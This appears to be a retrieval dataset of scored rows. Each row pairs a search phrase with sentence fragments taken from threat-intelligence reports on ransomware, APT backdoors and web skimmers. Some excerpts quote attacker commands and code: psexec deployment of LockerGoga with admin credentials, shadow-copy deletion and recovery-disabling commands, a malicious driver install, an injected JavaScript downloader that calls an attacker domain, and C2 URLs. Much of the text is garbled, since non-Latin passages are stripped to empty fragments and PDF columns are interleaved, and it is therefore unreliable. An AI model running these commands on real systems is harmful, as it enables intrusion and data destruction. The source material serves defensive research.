with batch scripts|0.7566137306262253|['In 2019 we saw several cases in which threat actors that historically targeted sensitive information such as personally identifiable information (PII) and credit card information turned to ransomware to monetize access to victim networks.', 'FIN6 In one case, FIN6, a cyber crime group known to target payment card information, was identified operating inside a company in the engineering sector.', 'The presence of FIN6 in an engineering company with no connection to payment card information seemed odd.', 'The Mandiant investigation revealed that the attacker was in the early stages of a deploying LockerGoga.', 'Using domain administrator credentials, the attacker ran batch files containing psexec commands to connect to remote systems and deploy LockerGoga.', 'The batch scripts (Fig.', '11) executed LockerGoga as the service mstdc, which was likely the attackers attempt to masquerade as the legitimate Windows service msdtc.', 'The batch files used by Figure 11. the attacker followed the naming convention xaa.bat, xab.bat, xac.bat and Strings from so on.', 'deployment BAT files.', 'start copy svchost.exe \\\\\\\\10.1.1.1\\\\c$\\\\windows\\\\temp\\\\start psexec.exe \\\\\\\\10.1.1.1 -u domain\\\\domainadmin -p password -d -h -r mstdc -s -accepteula -nobanner c:\\\\windows\\\\temp\\\\svchost.exe Mandiant analysts linked the tools and attacker infrastructure to other FIN6 activity, and eventually concluded that FIN6 had expanded to using ransomware to further monetize their access to compromised environments.', 'UNC1733 In 2019, UNC1733 targeted a retailer and tried to obtain payment card information from the point-of-sale (POS) environment.']
Uses GetComputerName to query the computer name.|0.7792337179780389|"[']com:8000 Cache-Control: no-cache Example 4 The Cobalt Strike implant communicates with a C2 server over the HTTP protocol: ""hxxp://23.224.91[.', ']98/owa/?path=/calendar&wa=fa5fQcmE_ qaSqyCFDP6zxAonSbVYV5Zh3velwTIWCJa0F9_nQiAuFdheT70rmBUBq7mnY0b7yR8FnhjNF19EBc7u_ bvm8uTCEx6rG9kyxOUcFlggjMUzur2tQJ-NmPlFB97t3LPsXdYkbaBiKBdFtbkAXeW9xRdwFuT29FFpays"" ""hxxp://47.96.167[.', ']205:8088/owa/?path=/calendar&wa=e89wNPykFLPfHbYB7EZQBa3r5iNVI1xVVTGsRd NyDpGe63-4pAmE9ZLjU8ImCUKG8L_JvKk9yN2MsD78LpRmOazvvojXhUow8zQoBVqn-kV-HC-VqmI_2 BTCqlQHjOBpyMBJyQ3SmBin6xfNZsUkH7_H_Sa79SEA774gG0PGzk8"" Example 5 A file (MD5: 4e43c0ca1feebc1c7107a8ebb53255b9) that was found during an incident investigation uses HTTPS to interact with its C2.', 'Modern Asian APT Groups: Tactics, Techniques and ProceduresTechnical details | Command and Control TA0011 | Application Layer Protocol: Web Protocols T1071.001 Contents 267 Command name Command description ls Get a list of objects in the specified directory.', 'execute Run an arbitrary file or command.', ""getcomputername Get the computer's name."", 'Download a file to an infected system and save it with the specified name.', 'Information about the download result is forwarded to the server at mirror-exchange[.', ']com/upload/ upload with the system ID (GET parameter ""id""), file name and error code (GET parameter ""file"") specified.', 'exit Terminate the backdoor.', 'Detection All of the analyzed examples attempt to look legitimate, which makes detection of the Application Layer Protocol: Web Protocols T1071.001 technique more difficult.']"
scripts to download additional scripts.|0.7570513237441496|['The attack impacted organizations in the following sectors: Transportation Print & Digital Building & Logistics Media Materials Insurance Financial Automation Services SENTINELONE WATCHTOWER END OF YEAR 2023 41In June 2023, Censys showed over 3.000 hosts utilizing the MOVEit service.', 'Key general statistics from Censys about the different service providers and host locations can be found below.', 'Threat actors almost exclusively use this vulnerability in the United States, with only a few hundred other hosts exposed in other countries.', 'A list of vulnerable MOVEit Transfer versions is attached below for reference: SENTINELONE WATCHTOWER END OF YEAR 2023 42July 2023: Spike in Mallox Targeting MS-SQL In 2023, WatchTower hunters investigated and tracked over seven Mallox intrusions.', 'In these instanc- es, we observed the following kill chain: The threat actor exploits a SQL server to get a shell.', 'They download additional PowerShell scripts.', 'This PowerShell script downloads an MSI file (PurpleFox) PurpleFox establishes persistence and attempts privilege escalation.', 'WatchTower observed malicious and obfuscated PowerShell command lines originating from the SQL server post-compromise.', 'Next, the threat actor downloads malicious payloads from the remote server.', 'In some cases, Watch- Tower hunters saw PurpleFox download additional files from a remote C2.', 'From our multiple Mallox incident investigations, we observed Mallox ransomware operators gaining access to an endpoint that was not managed or protected by SentinelOne, and deploying an encryptor payload.']
brute-force activity|0.9016249427933549|['The script, which is loaded by many sites, JS sniffers can be installed by obtaining would load a bank card JS sniffer along access to a websites administrator panel with itself.', 'with permission to edit files.', 'The login and password can be compromised through This type of malware delivery can result several methods: in rival sniffer families being hacked.', 'For stealers, i.e.', 'programs that extract instance, during one wave of infections, passwords saved in browsers; the operators of the WebRank sniffer gained access to the MagentoName malware for intercepting entered data JS sniffer code and added their malicious (including logins and passwords); code to it.', 'brute force.', 'Another example is the attack on Feedify, a real-time push notification service.', 'Hacking of third-party services By injecting the JS sniffer code into A sniffer can infiltrate a website through the code of a given file, the threat hacked third-party services, whose actor automatically uploaded the scripts work on the target website: JS sniffer to all Feedify customers, Hacking websites that provide and their sites were infected with the services for online stores (customer feedbackembad-min-1.0.js script.', 'The support chats or analytics and sniffer was injected into the Feedify statistics systems).', 'By injecting code on August 17, and was detected malicious code into the service and removed on September 11.', 'However, script code, a JS sniffer infiltrates the intruders infected the website again the code of online store websites.']
cmd /C|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd /C|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd /C|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd /C|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd /C|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd /c|0.8005088309270048|"['The following is a knowledge base of SQL queries, based on the Adversary Tactics, Techniques, and Common Knowledge (ATT&CK) adversary model, developed by MITRE.', 'These SQL queries are based on MITREs recommended analytics, and are meant to further assist the SOC analyst in their threat hunt for a potential breach on their network.15 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 1.', 'USE CASE: Reg.exe called from Command Shell Tactic: TTP MITRE Reference: CAR-2013-03-001: Reg.exe called from Command Shell Hypothesis: Registry modifications are often essential in SQL Query: establishing persistence via known Windows mechanisms.', ""Many legitimate modifications are done graphically via select source.name, data.process.cmd, count(*) AS regedit.exe or by using the corresponding channels, or even hostcount from network-events where type = 'sysmon' calling the Registry APIs directly."", ""The built-in utility reg.exe AND data.process.action = 'launch' AND data.process."", ""provides a command-line interface to the registry, so that image.file = 'reg.exe' AND data.process.parentImage.file = queries and modifications can be performed from a shell, such 'cmd.exe' AND as cmd.exe."", 'When a user is responsible for these actions, the parent of cmd.exe will likely be explorer.exe.', ""Occasionally, (data.process.cmd LIKE '%add%' OR data.process.cmd LIKE power users and administrators write scripts that do this '%delete%' OR data.process.cmd LIKE '%copy%' OR data."", 'behavior as well, but likely from a different process tree.', ""process.cmd LIKE '%restore%' OR data.process.cmd LIKE These background scripts must be learned so they can be '%load%' OR data.process.cmd LIKE '%import%') order by tuned out accordingly."", 'hostcount DESC16 KCATTA TAERHT FO SROTACIDNI :SRETNUH TAERHT 2.']"
cmd /c|1.0|['-    -   .', 'Hi-Tech Crime Trends         ,  - ,  .', 'Hi-Tech Crime Trends  -,  - , SOC-,   ,      .', 'Hi-Tech Crime Trends  -   ,     ,  .', 'Group-IB  ,  ,    -    -   .', '.', 'Group-IB:  ,  ,   Leaks  ,  ,      ,  ,  ,  Group-IB   ,  ,     ,   ,   ,   GROUP-IB.RU  6   Group-IB    Hi-Tech Crime Trends,              .', ': Group-IB Threat Intelligence, Fraud Protection, Managed XDR, Incident Response Digital Risk Protection.', 'Group-IB            , ,  - .', ',   Group-IB    ,     .', ', - -   .']
cmd /c|0.8005088309270048|"[', ,     APT28.', ', ,       - .', ', -    .', ',      .', ': OCEANMAP - ,   C#.', 'cmd.exe.', 'IMAP.', ', base64- ,   (""Drafts"")   ;   , \'  .', '(""INBOX"").', '( ,    ),     .', "".URL- 'VMSearch.url'  .""]"
cmd /c|0.7893515727803749|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
cmd /c|0.8005088309270048|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
ARP table|0.7828924662024925|"['In their attack campaign, the dropper first deletes the file path of ApcHelper.sys through cmd.exe to add its malicious driver to the same path in the next steps: cmd.exe /c del /f /a /q %SYSTEMROOT%\\\\system\\\\ApcHelper.sys Next, it creates a new service for the kernel driver: sc create ApcHelper binPath= %SYSTEMROOT%\\\\system\\\\ApcHelper.sys type=kernel Finally, the dropper installs a kernel driver and uses it to stop the processes of various security products, including Sophos, ALsvc, HMPAlert, McsAgent, SAVAAdminService, SapApi, SavService, SEDService, and SSPService.', 'cmd.exe /c copy ApcHelper.sys %SYSTEMROOT%\\\\system\\\\ApcHelper.sys /Y 242.', 'Inhibiting System Recovery (T1490) According to a CISA flash report on Lockbit 2.0 malware published in February 2022, threat actors executed the following Windows Command Shell script to damage the built-in recovery [17]: cmd.exe ""C:\\\\Windows\\\\System32\\\\cmd.exe"" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no In this code, adversaries leveraged the vssadmin and wmic utilities to quietly delete all shadow copies on the compromised system, suppressing any confirmation prompts or output.', 'Following this, attackers used the bcdedit utility to modify the boot configuration data on the system, which is believed to be done to ignore all boot errors and continue booting.', 'Note that the recoveryenabled option is supplied to the bcdedit to disable recovery options for the default boot entry.', '3.', 'Discovering Domain Accounts (T1087.002) Another CISA report in February 2022 reveals that MuddyWater leveraged the following command to enumerate domain users [18]: cmd.exe net user/domain 25#1.4.', 'T1059.004 Unix Shell The Unix shell is a command-line interface that allows users to interact with Unix-like operating systems.', 'It includes several different shells, such as the Bourne Shell (sh), Bourne-Again Shell (bash), Z Shell (zsh), Korn Shell (ksh), and Secure Shell (SSH), which are commonly used.', 'The shell provides a variety of commands and features that make it easy to manage files and run programs on the system.', 'In addition to providing an interactive command-line interface (CLI), the Unix shell also includes a scripting language that allows users to write shell scripts.']"
ARP table|0.797284230997252|"['If the browser version contains a vulnerability, corresponding exploitation code gets run on the target system, potentially giving the attacker a remote code execution ability.', 'For these types of attacks, adversaries often leverage JavaScript.', 'For instance, according to a malware analysis report performed by Palo Alto, analyzing threat samples from April 2022 to June 2022, among all of the web threats detected during the research, JavaScript downloaders and redirectors were in the top 5 most leveraged web threats, infecting around 300 different domains [31].', 'Analysis shows that attackers often inject malicious JavaScript downloaders to a webpage owned by them, creating several new script elements that redirect website visitors to ads, spams, or any other malicious domains such as train[.]developfirstline[.', ']com: .', '.', '.', 'Element.prototype.appendAfter = function(element) { element.parentNode.insertBefore(this, element.nextSibling) ), false(function () { var elem = document.createElement(\'script"") elem.type = \'text / javascript\' elem.sc = \'https://train.developfirstline.com/delivery.js?s=3\' elem.appendAfter(document.getElementsByTagName(\'script\')(0]) elem.appendAfter(document.getElementsByTagName(""\'head\')[0]) document.getElementsByTagName(\'head\')(01.appendChild(elem) .', '.', '.', '37#1.8.']"
the encrypted data|0.8568495897884225|"['In modern cybersecurity approaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat intelligence.', 'Microsoft Digital Defense Report | September 2020 83TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSSARY breach ciphertext data estate encryption Any incident that results in unauthorized access of Data or information in its encrypted form used The procedures, services, and infrastructure used to The process of transforming plaintext into data, applications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes referred manage corporate data in the digital estate.', 'ciphertext.', 'by bypassing their underlying security mechanisms.', 'to as encrypted data.', 'A security breach occurs when an individual or data loss prevention (DLP) event an application illegitimately enters a private, cloud access security broker (CASB) A set of procedures and mechanisms to stop An observable occurrence in an information system confidential, or unauthorized logical IT perimeter.', 'A CASB is a software tool or service that sensitive data from leaving a security boundary.', 'or network.', 'sits between an organizations on-premises brownfield infrastructure and a cloud providers infrastructure.', 'denial of service exfiltration Existing deployed IoT/IIoT devices that might not They might also provide other services such as An attack that prevents or impairs the authorized The unauthorized transfer of information from an have modern hardware or functionality.']"
using the API|0.80642331878918|['ESET Research Whitepapers // August 2018 TURL A OUTLOOK BACKDOOR Analysis of an unusual Turla backdoor2 Turla Outlook Backdoor // Analysis of an unusual Turla backdoor 1.', 'CONTENTS 1.', 'Introduction.', '.', '.', '.', '.', '.', '.']
using the API|0.80642331878918|"[': //http://localhost:3699/api/GetSources?Type=3&start=1532620329&end=1532620329 : [ { ""Type"": 3, ""IP"": """", 23""Mac"": """", ""Name"": "" Scotland Redmoss 1,9km"", ""StationNumber"": """", ""Time"": 1532563200000, ""GeoX"": 57.13, ""GeoY"": -2.12, ""Extras"": ""Vsat "" }, { ""Type"": 3, ""IP"": """", ""Mac"": """", ""Name"": ""iDirect HUB iNFINITI"", ""StationNumber"": """", ""Time"": 1538572327000, ""GeoX"": 55.784,""GeoY"": 37.486, ""Extras"": ""-NSS 7; -Ku-3 Norsat; -Vertical; -12558014279; vsat_-iDirect HUB iNFINITI; _-1538572327; - 55,784|37,486; - Moscow Oblast Khoroshevo-Mnevniki (159000) 0,9km"" }, ... ]   1.   : {ip}:9850/api/GetState : [ { ""Id"": 1, ""Name"": """", ""Status"": ""Ok"", ""Message"": "" .', ': 478"" },... ]  1.   id : {ip}:9850/api/KeyWords/{id} //GET : id  .', ': //http://localhost:3699/api/KeyWords/1 [ { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [""*"",""Sergy*"",""356"",""Test rub 358999"",""Last Add rub 66""] }, 24{ ""ID"": 1, ""Language"": ""CA"", ""KeyWords"": [""ARRAMBADA"",""BANDARRA"",""BARRINAR"",""BOLLERA"",""BOLLICAO"",""CAGANER"", ""CARDAR"",""CASCAR&SE&LA"",""COLLONS"",""CONSOLADOR"",""CONY"",""CUL"",""ESCALFAPOLLES"",""FAR RANACO"",""FER&UN&RIU"", ""FIGA"",""FILL&DE&PUTA"",""FILL&DE&VERRA"",""FOLLADOR"",""FOLLAR"",""FURNICAR"",""GALLUMBOS"","" GILIPOLLES"",""HINYAR "",""LLEPAR"",""LLETERADA"",""MAMADA"",""MANOLA"",""MARIETA"",""MARIPILI"",""PAJARITO"",""PARRS"",""P ELAR&SE&LA"",""PUT A"",""PUTOT"",""TREMPERA"",""TXITX*"",""XONA"",""XUFA""] }, { ""ID"": 1, ""Language"": ""CS"", ""KeyWords"": [""BUZERANT"",""CHUJ"",""HOVNO"",""KOULE"",""KUNDA"",""KURVA"",""PRDEL"",""VEJCE"",""ZMRD""] },... ] 2.   id .', 'POST.', ': { ""ID"": 1, ""Language"": ""AR"", ""KeyWords"": [ ""*"", ""Sergy*"", ""356"", ""Test rub 358999"", ""Last Add rub 667"" ] }   1.  : {ip}:9850/api/rubriclist?Parent=-1 //  {ip}:9850/api/rubriclist?Parent=20 //  Parent=20 : [ { ""ID"": 0, ""ID1"": 0, ""Parent"": null, ""Name"": ""Uknown"" }, { ""ID"": 1, ""ID1"": 1, ""Parent"": 0, ""Name"": ""Garbage"" 25},... ] : Url=""/json/rubrics/5 2.  : {ip}:9850/api/rubriclist api/LanguageList : [ { ""ID"": 0, ""ID1"": 0, ""ShortName"": ""UN"", ""Name"": ""UN-Unknown"" }, { ""ID"": 1, ""ID1"": 1, ""ShortName"": ""AA"", ""Name"": ""AA-Afar"" }, { ""ID"": 2, ""ID1"": 2, ""ShortName"": ""AB"", ""Name"": ""AB-Abkhazian"" },... ] API     .', '.', ',     .', '.', '-    .', '26      -     ,    (),  (),   ().', '-  .']"
using the API|0.80642331878918|['19 Corelan Team.', 'Starting to write Immunity Debugger PyCommands : my cheatsheet.', 'January 2010.', '10 www.fireeye.comPoison Ivy: Assessing Damage and Extracting Intelligence Defenders View Attackers View Starting ChopShop Initializing Modules ... Initializing module poisonivy_23x Transferred files will be saved.. Screen/Cam/Audio/Key captures will be saved.. Running Modules ... [2013-07-03 06:46:29 PDT] Poison Ivy Version:2.32 [2013-07-03 06:46:30 PDT]*** Host Information*** PI profile ID: mal IP address: 192.168.0.12 Hostname: BLUE Windows User: admin Windows Version: Windows XP Windows Build: 2600 Service Pack: Service Pack 3 [2013-07-03 06:46:36 PDT] *** Shell Session *** Microsoft Windows XP [Version 5.1.2600] (C) Copyright 1985-2001 Microsoft Corp. C:\\\\> [2013-07-03 06:46:42 PDT] *** Shell Session *** ipconfig [2013-07-03 06:46:43 PDT] *** Shell Session *** Windows IP Configuration Connection-specific DNS Suffix .', ': IP Address.', '.', '.', '.', '.', '.', '.']
using the API|0.80642331878918|['1.RedEyes(also known as APT37, ScarCruft, Reaper)   APT   , ,    .', '.', 'ASEC(AhnLab Security Emergengy response Center) 2023 5 RedEyes Ably  Golang         .', '*ABLY[1]    Pub/Sub , , ,   .', 'Ably  Golang  ,  API  Github .', 'API        .', '.ASEC  2023 5 RedEyes     ,     TTPs(Tactics, Techniques, and Procedures) .2.2.1.']
using the API|0.80642331878918|['DLL- 2.', '.dat (SbieDll.dll / SbieMsg.dll) 3.', '.dat DLL 4.', 'MemLoadLibrary 5.', '9002 RATDeed RATMITREIOCs  2019   Positive Technologies (PT Expert Security Center, PT ESC)  ,   - .', '.', '2020      .', ',  ,      .', '2021 PT Expert Security Center  .', '.', '.']
computer name|0.9941158051361211|[]
computer name|0.765093203018953|"['probable targets.', 'becomes part of a unique ""browser fingerprint"" that can identify the users computer moving forward.', '4SPECIAL REPORT Pinpointing Targets: Exploiting Web Analytics to Ensnare Victims THE OPERATION B eginning last year, we identified cyber When an unsuspecting user visits any of the actors integrating free, publicly available over 100 compromised websites, a small piece The following are tools with custom scripts to monitor the of inserted codeembedded in the sites HTML examples of some of the online activities of Internet users without their and invisible to casual visitorsquietly redirects web tools embedded knowledge,2 just as corporations track the online the users browser to a second compromised in the WITCHCOVEN activity of web users around the world.', 'We website without the users knowledge.', 'This code and the data they collect: believe these cyber threat actors are building second website hosts the WITCHCOVEN profiles of potential victims and learning about script,4 which uses profiling techniques to collect the vulnerabilities in users computers.', 'These very technical information on the users computer.', 'same technologies that marketing firms use to As of early November 2015, we identified a track their clients and ensure their websites work total of 14 websites hosting the WITCHCOVEN on different types of web browsers can help cyber profiling script.', 'The detect Office threat actors better identify their victims and module from the tailor future infection attempts.', 'Browser Exploitation We believe these cyber threat Framework,5 an open The cyber threat actors start by compromising source penetration actors are building profiles of large numbers of legitimate websites.', 'The testing tool, determines potential victims and learning websites are not randomly chosen targets of the Microsoft Office opportunity, but specifically selected as part of about the vulnerabilities in version on a computer a tactic called a strategic web compromise.3 The users computers.', 'by testing the browsers attackers then modify the underlying HTML response to various ActiveX objects.']"
computer name|0.765093203018953|['versions of the RAT including the ability to start a 204 52 Unknown.', 'command shell, control processes and services, 256 32 Nullterminated computername(if upload/download files, terminate TCP connections, successfullyobtainedfromthesystem).', 'createuseraccounts, retrievesystem information, log 288 12 Processname.', 'useractivity(viaakeylogger), modifytimestamps on 300 52 0x00 bytes inallobserved files, conduct process injection, conduct denial of communications.', 'service attacks and shutdown or restart the 352 36 SYSTEM_INFO16structure(format showninAnnexB).', 'computer.', 'Commands supported by the XShell softwarearelisted inAnnexC.', '(XTiger) 388 72 0x00 bytes inallobserved samples.', '460 12 Unknown.', '472 4 Localeidentifier17.', '18Theprocess svchost.exe isagenerichostprocessforservices 476 4 Tick count(repeated).']
computer name|0.7734214465342704|['Out of the created files, all files are obfuscated except for the legitimate doc file.Lomd02.png (Malicious jse script)Operator.jse (Malicious jse script)WindowsHotfixUpdate.jse (Malicious jse script)20231126_9680259278.doc (Legitimate doc file)WindowsHotfixUpdate.ps1 (Malicious PowerShell script)A legitimate document file, 20231126_9680259278.doc, is included among the created files.', 'The threat actor has probably included this to deceive the user into thinking that they opened a legitimate file.Operator.jse creates a Task Scheduler entry that executes WindowsHotfixUpdate.jse, which in turn executes the file WindowsHotfixUpdate.ps1.', 'The file WindowsHotfixUpdate.ps1 receives commands from the C2, and it is presumed that these commands are obfuscated, because the jse file with the file name Lomd02.png was observed deobfuscating such commands and loading them in xml format.While additional commands could not be examined due to the C2 being unavailable for access at the moment, it seems that various additional attacks would be possible depending on the commands sent from the C2.Task Scheduler name: WindowsHotfixUpdate[B409302303-02940492024]Trigger: Repeat every minute indefinitelyAction: Execute C:\\\\ProgramData\\\\WindowsHotfixUpdate.jseBecause the bait file is also run, ordinary users cannot recognize that their systems are infected by malware.', 'Since such malware are aimed at specific targets, users should refrain from running attachments in emails sent from unknown sources.', '[File Detection]Backdoor/JS.Konni (2023.12.06.03)Backdoor/Win.Konni (2023.12.06.03)Backdoor/PowerShell.Konni (2023.12.06.03)MD5682b5a3c93e107511fdd2cdb8e50389a78ea811850e01544ca961f181030b584a93474c3978609c8480b34299bf482b7b58eb8a3797d3a52aba30d91d207b688d06d1c2ec1490710133dea445f33bd19URLhttp[:]//gjdow[.]atwebpages[.]com/dn[.', ']php?name=[Computer']
screenshot|0.8864293699612327|"['In this case, the created tasks will be executed with the highest level of privileges; /f a parameter that makes it possible to create a task containing a disabled alert about a previously created task with the same name.', 'If an error occurs, an attempt is made to execute the same command but without the /rl HIGHEST flag.', 'Next, an attempt is made to create a scheduler task with the schtasks.exe /create /tn \'Flash Player Update\' /sc HOURLY /tr ""<cmd2>"" /f command, where: cmd2 the parameter containing the wscript.exe C: \\\\ProgramData\\\\MicrosoftSecurityChecker\\\\SecurityCheck.js value; sc HOURLY the parameter that indicates the number of hours before the task is executed.', 'Next, tasks that were created in the scheduler are verified using the schtasks.exe /query /v /fo csv /tn <task_name> command.', 'The results of this check are saved to a temporary file, which is sent to the C&C server.', 'While it is in transit, a screenshot is taken, which is also uploaded to the server.', 'When these files are sent, a special parameter is added to the request.', 'The &status=check1 parameter is added to the results produced by checking the created Microsoft Security Check task.', 'The &status=check2 parameter is added to the results produced by checking the Flash Player Update task.', 'The privileges of the created tasks are verified by running net session.', 'Upon executing the task, the backdoor calls two functions: the lr_cmdr with the done=1 argument and the lr_stats with the task_autorun_scheduler:end argument.']"
screenshot|0.9294432636192079|"['The domain names include various combinations of the words American, relief, rescue, care, covid, pandemic and similar.', 'The American Rescue Plan phishing campaign, along with others using similar pretenses to trick users into giving away sensitive information, shows that even after a year and a half, the pandemic continues All the websites have a page title of Application Form | Unemployment Insurance Relief During to create fertile ground for scammers.', 'People should treat online forms with the utmost caution, and COVID-19 Outbreak | American Rescue Plan Act.', 'The heading of the form itself is either only access government websites by directly navigating to them, never from links in emails or else- Unemployment Insurance Application Form or Virus Rescue Insurance Application Form, as seen where.', 'Federal government websites end with a .GOV domain.', 'in the screenshot.', 'The fake application forms harvest sensitive personal information including social security numbers and even request that victims upload a photo of their state ID or driving license.', 'Aryeh Goretsky, ESET Distinguished Researcher ESET THREAT REPORT T2 2021 |28EMAIL THREATS As emails distributing malicious macros plummeted in T2 2021, phishing and fraudulent messages took over the email threat scene.', 'Overall detections of malicious emails saw a slight increase in T2 2021, growing by 7.3% com- pared to T1.', 'The period was characterized by a number of large spikes of activity and dynamic HTML/Phishing.Agent trojan 17.4% developments within specific email threat detections.', 'While malicious macros detected as DOC/Fraud trojan 14.9% VBA/TrojanDownloader.Agent trojan fell, phishing and fraudulent emails flourished.']"
the scheduled task|0.7609125773549177|['Tactic ID Name Description Initial ScarCruft uses watering-hole attacks to T1189 Drive-by Compromise Access compromise victims.', 'Execution Command and Scripting Interpreter: T1059.006 The Dolphin loader a uses Python script.', 'Python 7/8Tactic ID Name Description Command and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.007 JavaScript watering-hole attack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T1106 Native API files and inject processes.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.005 Task start after installation.', 'Persistence Boot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.001 Registry Run Keys / Startup Folder loader.', 'Process Injection: Portable Defense T1055.002 Dolphin can inject into other processes.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Password Stores: Dolphin can obtain saved passwords from Credential T1555.003 Credentials from Web Browsers browsers.', 'Access T1539 Steal Web Session Cookie Dolphin can obtain cookies from browsers.']
the scheduled task|0.9853055362682503|['Copyright Leonardo S.p.a. All rights reserved 22 Company General UseMALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE ATT&CK TTPs T1059 Command-Line Command-line interfaces provide a way of interacting with computer Interface systems and is a common feature across many types of operating system platforms.', 'One example command-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc.', 'Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a well-established method used by both defenders and adversaries to hide open ports from access.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port will be opened.', 'Usually this series of packets consists of attempted connections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.', 'T1105 Remote File Files may be copied from one system to another to stage adversary Copy tools or other files over the course of an operation.']
the scheduled task|0.7851153157084942|['Pgina 7 de 11RESEARCH_ Docless Vietnam APT -A technique still alive- The code contains Bai.doc in base64, which is the decoy document.', 'And uses scheduled tasks to persist, checking if the victim has privileges.', 'This file checks if the user is administrator.', 'If so, it copies the DLL file in WINDIR\\\\debug\\\\ and %TEMP% otherwise.', 'If administrator, it will create a scheduled task with SYSTEM privileges, if not, it will try without so high privileges Aside, this file is in charge of persistence.', 'It creates a scheduled task.', 'It is quite interesting that the malware checks if Kaspersky (avp.exe process) is running in the system and acts differently if so.', 'If Kaspersky IS in the system, it will create a scheduled task that runs a vbs script, as usual.', 'But if Kaspersky is NOT present in the system, it will rename the vbs to TXT and run wbscript with the parameter /E:vbscript that allows the program to know what kind of script it is running.', 'We guess this is trying to bypass the detection tin some way, although it sounds counterintuitive.', 'The final stage, uninstalling yourself The system runs the DLL with InstallUtil.exe, to avoid Smartscreen and Applocker.']
